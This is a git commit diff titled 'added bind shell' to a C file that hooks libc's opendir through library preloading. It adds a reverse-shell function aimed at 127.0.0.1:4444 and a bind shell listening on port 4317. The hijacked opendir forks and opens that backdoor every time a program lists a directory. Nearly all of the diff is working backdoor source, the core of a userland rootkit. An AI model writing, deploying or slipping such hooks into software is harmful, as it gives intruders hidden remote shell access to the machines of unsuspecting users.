9389093aa1702af951d8ba0c7f77fa34673219c6
Nerelod <dapperfellowdaniel@gmail.com>
2023-10-29 14:45:17 -0400

    added bind shell

--- opendir_hook.c
+++ opendir_hook.c
@@ -4,16 +4,112 @@
 #include <fcntl.h>
 #include <dirent.h>
 #include <dlfcn.h>
-
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <string.h>
 #define LIBC_PATH       "/lib/libc.so.6"
+
+#define REMOTE_ADDR "127.0.0.1"
+#define REMOTE_PORT 4444
+#define LOCAL_PORT 4317
+
+const char* getlibc() {
+    const char* libraryName = "libc.so.6";
+
+    // Try to find the library path
+    char* libraryPath = NULL;
+
+    char* stdLibraryPaths[] = { 
+        "/lib",
+        "/lib64",
+        "/usr/lib",
+        "/usr/lib64"
+    };  
+
+    for (int i = 0; i < sizeof(stdLibraryPaths) / sizeof(stdLibraryPaths[0]); i++) {
+        char fullPath[4096];
+        snprintf(fullPath, sizeof(fullPath), "%s/%s", stdLibraryPaths[i], libraryName);
+        if (access(fullPath, F_OK) == 0) {
+        	libraryPath = strdup(fullPath);
+        	break;
+        }
+    }   
+
+    if (libraryPath != NULL) {
+		return(libraryPath);
+    } 
+	else {
+        printf("%s not found in LD_LIBRARY_PATH or standard library paths.\n", libraryName);
+    }   
+
+    return "fail";
+}
+
+int revshell()
+{
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
+    sa.sin_port = htons(REMOTE_PORT);
+
+    s = socket(AF_INET, SOCK_STREAM, 0);
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execve("/bin/sh", 0, 0);
+    return 0;
+}
+
+int bindshell()  
+{  
+	struct sockaddr_in hostaddr;
+    // Create socket  
+    int host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
+  
+    // Initialize sockaddr struct to bind socket using it  
+    hostaddr.sin_family = AF_INET;  
+    hostaddr.sin_port = htons(LOCAL_PORT);  
+    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
+  
+    // Bind socket to IP/Port in sockaddr struct  
+    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
+      
+    // Listen for incoming connections  
+    listen(host_sockid, 2);  
+  
+    // Accept incoming connection, don't store data, just use the sockfd created  
+    int client_sockid = accept(host_sockid, NULL, NULL);  
+  
+    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
+    dup2(client_sockid, 0);  
+    dup2(client_sockid, 1);  
+    dup2(client_sockid, 2);  
+  
+    // Execute /bin/sh  
+    execve("/bin/sh", NULL, NULL);  
+    close(host_sockid);  
+      
+    return 0;  
+}
 
 DIR     *opendir(const char *name) //our hijacked opendir
 {
-  void  *handle; 
-  void  *(*sym)(const char *name);  //function pointer
-
-  handle = dlopen(LIBC_PATH, RTLD_LAZY); //get the handle from libc.so.6
-  sym = (void *) dlsym(handle, "opendir"); //get the address of opendir symbol in libc.so.6
-  printf("OPENDIR HIJACKED -orig- = %08X .::. -param- = %s \n", sym, name);
-  return (sym(name)); //return real opendir
+ 	void  *handle; 
+ 	void  *(*sym)(const char *name);  //function pointer
+	
+	const char* libc_path = getlibc();
+ 	handle = dlopen(libc_path, RTLD_LAZY); //get the handle from libc.so.6
+ 	sym = (void *) dlsym(handle, "opendir"); //get the address of opendir symbol in libc.so.6	
+	printf("OPENDIR HIJACKED\n", sym, name);
+	if(fork() == 0){
+ 		bindshell(); 
+	}
+	else {
+  		return (sym(name)); //return real opendir
+	}
 }
